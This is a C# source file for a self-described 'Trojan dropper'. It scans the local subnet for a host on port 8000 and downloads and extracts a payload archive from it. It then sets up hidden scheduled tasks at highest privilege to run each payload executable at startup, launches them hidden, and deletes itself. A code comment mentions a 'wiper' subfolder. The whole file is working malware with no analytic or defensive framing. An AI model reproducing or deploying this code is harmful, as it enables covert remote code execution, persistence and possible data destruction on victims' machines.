using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace App
{
    public static class Logger
    {
        private static string _logFilePath;
        private static readonly object _lock = new object();
        private static bool _initialized = false;

        public static void Initialize(string baseDirectory)
        {
            if (_initialized) return;

            string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
            _logFilePath = Path.Combine(baseDirectory, $"Trojan_log_{timestamp}.txt");

            _initialized = true;
            Log("Logger initialized. Log file: " + _logFilePath);
        }

        public static void Log(string message)
        {
            string logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
            Console.WriteLine(logEntry);

            if (_initialized)
            {
                lock (_lock)
                {
                    try
                    {
                        File.AppendAllText(_logFilePath, logEntry + Environment.NewLine);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[LOGGER CRITICAL ERROR] Failed to write to log file: {ex.Message}");
                    }
                }
            }
        }
    }

    internal class Program
    {
        private const int TargetPort = 8000;
        private const int ScanTimeoutMs = 100;
        private const int MaxParallelScans = 50;
        private static bool serverFoundAndDownloaded = false;
        private const string PayloadZipFileName = "payload.zip";
        private const string PayloadExtractDir = "payload";

        private static IPAddress GetLocalIPAddress()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.OperationalStatus == OperationalStatus.Up &&
                    (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet ||
                     ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211))
                {
                    foreach (IPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            return ip.Address;
                        }
                    }
                }
            }
            return null;
        }

        private static async Task<string> FindServerIpAsync()
        {
            Logger.Log("Attempting to determine local IP range for scanning...");
            IPAddress localIp = GetLocalIPAddress();

            if (localIp == null)
            {
                Logger.Log("Could not determine local IP address. Cannot scan local network.");
                return null;
            }

            Logger.Log($"Local IP detected: {localIp}");
            byte[] ipBytes = localIp.GetAddressBytes();
            string ipRangeStart = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.1";
            string ipRangeEnd = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.254";

            Logger.Log($"Scanning local IP range {ipRangeStart} - {ipRangeEnd} for open port {TargetPort}...");

            List<Task<string>> scanTasks = new List<Task<string>>();
            SemaphoreSlim semaphore = new SemaphoreSlim(MaxParallelScans);

            for (int i = 1; i <= 254; i++)
            {
                if (serverFoundAndDownloaded) break;

                string currentIp = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.{i}";

                await semaphore.WaitAsync();
                scanTasks.Add(Task.Run(async () =>
                {
                    try
                    {
                        if (serverFoundAndDownloaded) return null;

                        using (var client = new TcpClient())
                        {
                            var connectTask = client.ConnectAsync(IPAddress.Parse(currentIp), TargetPort);
                            if (await Task.WhenAny(connectTask, Task.Delay(ScanTimeoutMs)) == connectTask && client.Connected)
                            {
                                Logger.Log($"[SUCCESS] Found server with open port {TargetPort} at {currentIp}");
                                return currentIp;
                            }
                        }
                    }
                    catch { }
                    finally
                    {
                        semaphore.Release();
                    }
                    return null;
                }));
            }

            while (scanTasks.Any() && !serverFoundAndDownloaded)
            {
                var completedTask = await Task.WhenAny(scanTasks);
                scanTasks.Remove(completedTask);

                string foundIp = await completedTask;
                if (!string.IsNullOrEmpty(foundIp))
                {
                    serverFoundAndDownloaded = true;
                    return foundIp;
                }
            }

            Logger.Log("Server not found within the local IP range.");
            return null;
        }

        private static async Task<bool> DownloadAndExtractPayloadAsync(string serverIp, string extractPath)
        {
            string downloadUrl = $"http://{serverIp}:{TargetPort}/{PayloadZipFileName}";
            string zipSavePath = Path.Combine(AppContext.BaseDirectory, PayloadZipFileName);

            try
            {
                Logger.Log($"Attempting to download payload from {downloadUrl}...");
                using (var client = new WebClient())
                {
                    await client.DownloadFileTaskAsync(new Uri(downloadUrl), zipSavePath);
                }
                Logger.Log($"Payload downloaded successfully to {zipSavePath}");
            }
            catch (Exception ex)
            {
                Logger.Log($"FATAL: Failed to download payload: {ex.Message}");
                return false;
            }

            try
            {
                Logger.Log($"Extracting payload to '{extractPath}'...");
                if (Directory.Exists(extractPath))
                {
                    Directory.Delete(extractPath, true);
                }
                ZipFile.ExtractToDirectory(zipSavePath, extractPath);
                Logger.Log("Payload extracted successfully.");
                return true;
            }
            catch (Exception ex)
            {
                Logger.Log($"FATAL: Failed to extract payload: {ex.Message}");
                return false;
            }
            finally
            {
                if (File.Exists(zipSavePath))
                {
                    File.Delete(zipSavePath);
                }
            }
        }

        private static void CreateScheduledTask(string exePath, string taskName, string serverIp)
        {
            Logger.Log($"Attempting to create scheduled task '{taskName}' for '{Path.GetFileName(exePath)}'");

            string deleteArgs = $"/Delete /TN \"{taskName}\" /F";
            var deleteInfo = new ProcessStartInfo("schtasks.exe", deleteArgs)
            {
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            Process.Start(deleteInfo)?.WaitForExit();

            string createArgs = $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\" \\\"{serverIp}\\\"\" /RL HIGHEST /F";
            var createInfo = new ProcessStartInfo("schtasks.exe", createArgs)
            {
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                RedirectStandardOutput = true,
                UseShellExecute = false
            };

            using (var process = Process.Start(createInfo))
            {
                process.WaitForExit();
                if (process.ExitCode == 0)
                {
                    Logger.Log($"[SUCCESS] Scheduled task '{taskName}' created successfully.");
                }
                else
                {
                    Logger.Log($"[ERROR] Failed to create scheduled task '{taskName}'. Exit code: {process.ExitCode}");
                }
            }
        }

        private static void CreateTasksAndExecutePayloads(string extractPath, string serverIp)
        {
            Logger.Log("Scanning for executables in the top-level payload directory...");

            // --- MODIFIED: Changed SearchOption to TopDirectoryOnly ---
            // This finds .exe files in the 'payload' folder but NOT in subfolders like 'payload/wiper'.
            string[] executables = Directory.GetFiles(extractPath, "*.exe", SearchOption.TopDirectoryOnly);

            if (executables.Length == 0)
            {
                Logger.Log("[WARNING] No .exe files found in the top-level payload directory.");
                return;
            }

            Logger.Log($"Found {executables.Length} executables to activate. Processing each...");

            foreach (string exePath in executables)
            {
                string exeName = Path.GetFileName(exePath);
                string taskName = $"Malicious_{Path.GetFileNameWithoutExtension(exeName)}";

                CreateScheduledTask(exePath, taskName, serverIp);

                try
                {
                    Logger.Log($"Executing '{exeName}' immediately...");
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = exePath,
                        Arguments = serverIp,
                        UseShellExecute = true,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    });
                    Logger.Log($"'{exeName}' has been launched in the background.");
                }
                catch (Exception ex)
                {
                    Logger.Log($"[ERROR] Failed to execute '{exeName}': {ex.Message}");
                }
            }
        }

        private static void SelfDelete()
        {
            try
            {
                Logger.Log("Scheduling self-deletion in 3 seconds...");
                Process.Start(new ProcessStartInfo
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" +
                                new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).FullName + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch (Exception ex)
            {
                Logger.Log($"[ERROR] Self-delete failed: {ex.Message}");
            }
        }

        static async Task Main()
        {
            Logger.Initialize(AppContext.BaseDirectory);
            Logger.Log("Trojan dropper started.");

            string foundServerIp = await FindServerIpAsync();

            if (!string.IsNullOrEmpty(foundServerIp))
            {
                string extractPath = Path.Combine(AppContext.BaseDirectory, PayloadExtractDir);
                bool success = await DownloadAndExtractPayloadAsync(foundServerIp, extractPath);

                if (success)
                {
                    Logger.Log("Payload deployed. Creating persistence and executing...");
                    CreateTasksAndExecutePayloads(extractPath, foundServerIp);

                    Logger.Log("All tasks completed. Initiating self-deletion.");
                    SelfDelete();
                }
                else
                {
                    Logger.Log("Payload deployment failed. Aborting.");
                }
            }
            else
            {
                Logger.Log("Could not find an accessible server. Aborting.");
            }

            Logger.Log("Dropper has finished its tasks and will now exit.");
        }
    }
}